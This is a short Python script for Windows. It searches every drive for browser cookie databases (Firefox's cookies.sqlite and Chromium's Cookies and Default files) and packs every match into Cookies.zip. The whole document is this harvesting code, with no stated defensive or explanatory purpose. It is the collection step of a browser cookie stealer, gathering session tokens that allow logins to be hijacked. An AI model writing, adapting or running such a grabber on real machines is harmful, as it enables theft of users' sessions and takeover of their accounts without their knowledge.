from os import walk;
from win32api import GetLogicalDriveStrings;
from zipfile import ZipFile;

def main():

  drives = GetLogicalDriveStrings().split("\x00");
  zip = ZipFile("Cookies.zip", "w");

  for drive in drives:
    for root, dir, files in walk(drive):
      for file in files:
        if file == "cookies.sqlite" or file == "Cookies" or file == "Default":
          
          file_path = root+'\\'+file;
          zip.write(file_path);

  zip.close();

main();